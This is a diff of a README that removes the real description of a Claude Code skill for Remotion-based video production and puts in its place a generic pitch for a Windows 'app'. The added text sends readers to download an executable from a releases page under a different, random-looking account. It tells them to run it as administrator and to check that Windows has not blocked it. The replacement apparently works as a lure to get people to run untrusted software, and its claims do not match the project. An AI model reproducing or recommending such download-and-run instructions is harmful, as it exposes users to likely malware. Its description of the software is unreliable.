@@ -1,135 +1,159 @@
-# Video Production Skill
+# 🎬 video-production-workflow - Simple tools for clean video edits
 
-A portable Claude Code skill for creating branded video content with **Remotion** (React-based video framework), **sound design**, and **voiceover**. Captures proven patterns from production — scene templates, animation language, component architecture, and end-to-end workflow.
+[![Download](https://img.shields.io/badge/Download-Releases%20Page-6A5ACD?style=for-the-badge)](https://github.com/Receptiongenusgracula905/video-production-workflow/releases)
 
-## What's Inside
+## 🚀 Getting Started
 
-```
-video-production/
-├── SKILL.md                        # Skill entry point
-├── README.md                       # This file
-└── rules/
-    ├── project-setup.md            # Scaffold a new Remotion project
-    ├── brand-system.md             # Define colors, gradients, typography for any brand
-    ├── components.md               # 5 reusable components (Background, GradientText, etc.)
-    ├── templates.md                # 9 scene templates (titles, callouts, quotes, prompts)
-    ├── scene-patterns.md           # Proven compositions (pro tips, competitor cards, etc.)
-    ├── scene-blueprints.md         # Copy-paste-ready code for all templates + custom scenes
-    ├── animation.md                # Spring physics, staggered entrances, highlight walking
-    ├── sound-design.md             # SFX categories, music beds, FFmpeg mixing
-    ├── voiceover.md                # Eleven Labs integration
-    ├── rendering.md                # Single/batch/chunk rendering workflows
-    └── workflow.md                 # End-to-end production pipeline
-```
+video-production-workflow is a Windows app for programmatic video editing. It helps you turn repeatable edit steps into a simple workflow.
 
-## Installation
+Use it if you want to:
 
-### Claude Code (Global)
+- process clips in a steady, repeatable way
+- keep edit steps in one place
+- reduce manual work on the same video tasks
+- run a workflow without learning a complex editor
 
-Copy the skill into your Claude Code skills directory:
+This project is built for everyday use on Windows. You visit the release page, download the app file, and run it on your PC.
 
-```bash
-git clone https://github.com/JJenglert1/video-production.git ~/.claude/skills/video-production
-```
+## 📥 Download the App
 
-Claude Code automatically loads skills from `~/.claude/skills/` when referenced.
+1. Open the [Releases page](https://github.com/Receptiongenusgracula905/video-production-workflow/releases)
+2. Find the latest release at the top of the page
+3. Download the Windows file from that release
+4. Save the file to a folder you can find again, such as Downloads or Desktop
 
-### Per-Project
+If your browser shows a prompt, choose to keep the file. The app comes from the project release page, so the file should use the name shown on that page.
 
-Clone into your project's `.claude/skills/` directory:
+## 🪟 Install on Windows
 
-```bash
-cd your-project
-mkdir -p .claude/skills
-git clone https://github.com/JJenglert1/video-production.git .claude/skills/video-production
-```
+After you download the file:
 
-### For Other Tools (Codex, etc.)
+1. Open File Explorer
+2. Go to the folder where you saved the download
+3. Double-click the file
+4. If Windows asks for permission, choose Yes
+5. Follow the on-screen steps until the app opens
 
-Clone wherever your tool reads skill/instruction files from:
+If the download is a .zip file, right-click it and choose Extract All first. Then open the extracted folder and run the app file inside it.
 
-```bash
-git clone https://github.com/JJenglert1/video-production.git ~/skills/video-production
-```
+## ✅ Before You Start
 
-## Usage
+For the smoothest setup, use a Windows PC with:
 
-Reference the skill by name in your Claude Code prompts:
+- Windows 10 or Windows 11
+- At least 4 GB of RAM
+- Enough free disk space for your video files
+- A screen resolution of 1366 × 768 or higher
+- A standard mouse and keyboard
 
-```
-Using the video-production skill, set up a new Remotion project for Acme Corp
-```
+For video work, more RAM and free disk space help a lot. Large source files can take time to load.
 
-```
-Use the video-production skill to create scenes for this transcript: [paste transcript]
-```
+## 📁 What This App Does
 
-```
-Following the video-production workflow, add sound design to this video
-```
+This workflow is made for repeatable video tasks. It can help with:
 
-You can also reference specific rule files:
+- preparing video files for editing
+- organizing steps in a set order
+- applying the same process to many clips
+- keeping your work consistent across projects
 
-```
-Follow the video-production brand-system rules to define colors for my brand
-```
+A programmatic workflow is useful when you do the same kind of edit again and again. Instead of starting from scratch each time, you use a set process.
 
-```
-Use the video-production animation patterns for these scene transitions
-```
+## 🧭 How to Use It
 
-## Quick Start: New Video Project
+After the app opens, follow a simple flow:
 
-1. **Set up the repo** → `rules/project-setup.md`
-   - Scaffold Remotion project, configure brand.ts, fonts.ts, asset pipeline
+1. Start the app
+2. Choose your source files
+3. Set the edit steps you want to use
+4. Check the order of those steps
+5. Run the workflow
+6. Save the output to a folder you can find later
 
-2. **Define your brand** → `rules/brand-system.md`
-   - Colors, gradients, typography, surfaces — swap these and everything inherits
+If the app asks for a project folder, use one folder for each job. That keeps inputs, outputs, and settings together.
 
-3. **Build components** → `rules/components.md`
-   - BrandBackground, GradientText, PillBadge, AnimatedText, BrandLogo
+## 🎛️ Common Tasks
 
-4. **Create templates** → `rules/templates.md`
-   - Pick from 9 proven templates: titles, callouts, quotes, prompts, split-screen
+Here are common things you may do with a video production workflow:
 
-5. **Compose scenes** → `rules/scene-patterns.md`
-   - Pro tips, pain points, competitor cards, side-by-side comparisons, notifications
+- trim clips to a set length
+- rename output files
+- sort media into folders
+- process several files at once
+- repeat the same edit rules on new clips
 
-6. **Animate** → `rules/animation.md`
-   - Spring physics, staggered entrances, highlight walking, idle float
+If you work on similar videos often, this kind of setup saves time and keeps results uniform.
 
-7. **Add sound** → `rules/sound-design.md`
-   - SFX on transitions, music beds, volume envelopes via FFmpeg
+## 🗂️ Suggested Folder Setup
 
-8. **Generate voiceover** → `rules/voiceover.md`
-   - Eleven Labs integration, script timing, Remotion audio embedding
+Use a simple folder layout like this:
 
-9. **Render & deliver** → `rules/rendering.md`
-   - Single scene, batch, chunk rendering for long scenes
+- `Input` for raw video files
+- `Output` for finished files
+- `Temp` for working files
+- `Project Notes` for your edit plan
 
-## Adapting for a New Brand
+A clear folder setup makes it easier to find the right files and fix mistakes.
 
-The entire system is brand-agnostic. To adapt for a new brand:
+## 🔧 Troubleshooting
 
-1. Replace colors in `brand.ts` with the new palette
-2. Replace font files in `public/fonts/` and update `fonts.ts`
-3. Replace logo assets in `public/brand/`
-4. Update gradient definitions
+If the app does not open:
 
-**No template or component code needs to change** — everything references the brand constants.
+- check that the download finished
+- make sure you extracted the file if it came in a zip
+- right-click the app and choose Run as administrator
+- confirm that Windows did not block the file
 
-## What This Skill Produces
+If the app opens but your files do not load:
 
-- **Title cards** — branded motion graphics overlays for video editing
-- **Scene transitions** — animated transitions between video sections
-- **Prompt displays** — code/text displays with walking highlights synced to voiceover
-- **Sound design** — background music with volume envelopes + SFX at key moments
-- **Animated backgrounds** — gradient breathing backgrounds for B-roll
-- **Complete video packages** — all of the above, assembled into a production pipeline
+- check the file type
+- make sure the file is not in use by another app
+- move the file to a local folder on your PC
+- try a shorter file path with simple folder names
 
-## Tech Stack
+If the output folder stays empty:
 
-- [Remotion](https://www.remotion.dev/) — React-based video framework
-- [FFmpeg](https://ffmpeg.org/) — Audio mixing, video concatenation, rendering
-- [WaveSpeed AI](https://wavespeed.ai/) — SFX and music generation
-- [Eleven Labs](https://elevenlabs.io/) — AI voiceover generation
+- check that you chose the right input files
+- make sure you clicked the run button or start command
+- confirm that you have permission to write to the output folder
+
+## 🧰 Tips for Better Results
+
+- Use short folder names
+- Keep source files in one place
+- Work on one project at a time
+- Save a copy of raw clips before you begin
+- Keep your output folder separate from your input folder
+- Use the same naming pattern for each project
+
+If you run the same workflow often, keep a small notes file with your usual steps. That makes the next run faster.
+
+## 🔐 File Safety
+
+Before you open any download, check that you got it from the release page linked above. Use the latest release file from the project page, then run it on your Windows PC
+
+## 🖥️ Best Use Cases
+
+This app fits well for:
+
+- YouTube editing
+- social video batches
+- internal training clips
+- repeatable content cuts
+- folder-based video jobs
+
+It works best when you want structure and repeat steps instead of manual editing each time.
+
+## 📦 Release Page
+
+Use this link to get the Windows download:
+
+[Visit the Releases page](https://github.com/Receptiongenusgracula905/video-production-workflow/releases)
+
+## 📝 Project Details
+
+- Repository: video-production-workflow
+- Description: JJ's special video production workflow for programatic editing
+- Platform focus: Windows
+- Download method: visit the release page to download the app
+- Use case: repeatable video editing workflow
